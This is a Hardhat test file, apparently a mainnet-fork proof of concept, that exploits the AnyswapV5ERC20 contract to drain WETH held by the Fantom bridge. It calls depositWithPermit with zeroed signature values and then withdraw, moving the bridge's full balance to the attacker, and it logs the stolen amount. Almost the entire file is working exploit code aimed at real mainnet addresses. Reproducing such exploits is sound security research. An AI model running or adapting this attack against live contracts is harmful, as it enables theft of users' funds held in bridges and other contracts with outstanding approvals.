const { ethers } = require("hardhat");

describe("AnyswapV5ERC20", function () {
  it("Exploiting, should steal fantom bridges tokens", async function () {
    const weth_address = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2";
    const anyswap_address = "0xB153FB3d196A8eB25522705560ac152eeEc57901";
    const fantom_address = "0xC564EE9f21Ed8A2d8E7e76c085740d5e4c5FaFbE";

    const [attacker] = await ethers.getSigners();
    console.log("Attacker: " + attacker)

    const WETH = await ethers.getContractAt("IERC20", weth_address)
    const anyswapv5erc20 = await ethers.getContractAt("IAnyswapV5ERC20", anyswap_address)

    // check if fantom bridge approval is there
    let allowance = await WETH.allowance(fantom_address, anyswapv5erc20.address);
    console.log(
      "Allowance of fantom bridge: " + ethers.utils.formatEther(allowance)
    );

    let capital_at_risk = await WETH.balanceOf(fantom_address);
    console.log("Capital at risk: " + ethers.utils.formatEther(capital_at_risk) + " WETH")

    let attacker_before = await WETH.balanceOf(attacker.address)
    console.log("Attacker balance before exploit: " + attacker_before)

    await anyswapv5erc20
      .connect(attacker)
      .depositWithPermit(
        fantom_address,
        capital_at_risk,
        0,
        "0x0",
        "0x0000000000000000000000000000000000000000000000000000000000000000",
        "0x0000000000000000000000000000000000000000000000000000000000000000",
        attacker.address
      );

    // exploit
    await anyswapv5erc20.connect(attacker).withdraw();

    let attacker_after = await WETH.balanceOf(attacker.address);
    console.log("Attacker balance after exploit: " + attacker_after);
    
    let fantom_bridge_after = await WETH.balanceOf(fantom_address)
    console.log("Fantom Bridge balance after exploit: " + ethers.utils.formatEther(fantom_bridge_after))
  });
});
